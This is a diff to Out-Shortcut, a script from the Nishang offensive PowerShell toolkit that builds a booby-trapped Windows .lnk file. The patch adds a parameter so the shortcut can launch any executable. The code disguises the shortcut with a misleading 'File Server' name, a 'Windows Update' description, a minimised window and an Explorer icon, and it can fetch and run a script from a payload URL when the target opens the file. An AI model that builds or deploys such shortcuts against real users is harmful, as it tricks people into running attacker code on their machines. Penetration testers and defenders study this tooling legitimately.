@@ -9,8 +9,11 @@ Nishang script which creates a shortcut capable of launching PowerShell commands
 The script generates a shortcut (.lnk). When a target opens the shortcut, the predefined powershell scripts and/or commands get executed.
 A hotkey for the shortcut could also be generated. Also, the icon of the shortcut could be set too.
 
+.PARAMETER Executable
+EXE which you want to execute on the target. Default is PowerShell.
+
 .PARAMETER Payload
-Payload which you want execute on the target.
+Payload which you want to execute on the target.
 
 .PARAMETER PayloadURL
 URL of the powershell script which would be executed on the target.
@@ -66,29 +69,34 @@ https://github.com/samratashok/nishang
 http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-powershell-used-again-in-new-attack/
 #>
     [CmdletBinding()] Param(
+        
         [Parameter(Position = 0, Mandatory = $False)]
+        [String]
+        $Executable = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+        
+        [Parameter(Position = 1, Mandatory = $False)]
         [String]
         $Payload,
         
-        [Parameter(Position = 1, Mandatory = $False)]
+        [Parameter(Position = 2, Mandatory = $False)]
         [String]
         $PayloadURL,
 
         
-        [Parameter(Position = 2, Mandatory = $False)]
+        [Parameter(Position = 3, Mandatory = $False)]
         [String]
         $Arguments,
 
-        [Parameter(Position = 3, Mandatory = $False)]
+        [Parameter(Position = 4, Mandatory = $False)]
         [String]
         $OutputPath = "$pwd\Shortcut to File Server.lnk",
 
-        [Parameter(Position = 4, Mandatory = $False)]
+        [Parameter(Position = 5, Mandatory = $False)]
         [String]
         $HotKey = 'F5',
 
 
-        [Parameter(Position = 5, Mandatory = $False)]
+        [Parameter(Position = 6, Mandatory = $False)]
         [String]
         $Icon='explorer.exe'
 
@@ -102,7 +110,7 @@ http://blog.trendmicro.com/trendlabs-security-intelligence/black-magic-windows-p
     }
     $WshShell = New-Object -comObject WScript.Shell
     $Shortcut = $WshShell.CreateShortcut($OutputPath)
-    $Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
+    $Shortcut.TargetPath = $Executable
     $Shortcut.Description = "Shortcut to Windows Update Commandline"
     $Shortcut.WindowStyle = 7
     $Shortcut.Hotkey = $HotKey
